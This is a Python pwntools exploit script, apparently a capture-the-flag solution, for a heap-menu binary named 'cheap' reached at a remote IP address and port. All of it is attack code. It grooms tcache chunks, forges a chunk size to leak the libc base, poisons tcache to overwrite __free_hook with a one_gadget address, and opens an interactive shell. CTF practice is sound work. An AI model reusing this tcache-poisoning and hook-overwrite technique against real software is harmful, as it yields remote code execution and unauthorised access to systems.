from pwn import *

# p = process('cheap')
# p = remote('localhost', 7777)
p = remote('34.146.101.4', 30001)
e = ELF('cheap')
libc = ELF('libc.so.6')

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

def create(size, data):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('size: ', str(size))
    p.sendlineafter('data: ', data)

def show():
    p.sendlineafter('Choice: ', '2')
    return p.recvline()[:-1]

def remove():
    p.sendlineafter('Choice: ', '3')

def exit():
    p.sendlineafter('Choice: ', '4')

# prepare for overwriting __free_hook
create(0x38, b'')
remove()
create(0x48, b'')
remove()
create(0x58, b'')
remove()

# libc leak
create(0x18, b'')
remove()
create(0x3e8, b'')
remove()
create(0x28, b'')
create(0x28, b'')

payload = b'A' * 0x18
payload += p64(0x421)
create(0x18, payload)
create(0x3e8, b'')
remove()

libc.address = u64(show().ljust(8, b'\x00')) - 0x1ebbe0
print(hex(libc.address))

# overwrite __free_hook
payload = b'A' * 0x38
payload += p64(0x61)
create(0x38, payload)
remove()
create(0x48, b'')
remove()

payload = b'A' * 0x38
payload += p64(0x61)
payload += p64(libc.symbols['__free_hook'])
create(0x38, payload)
create(0x58, b'')
create(0x58, p64(libc.address + one_gadget[1]))
remove()

p.interactive()
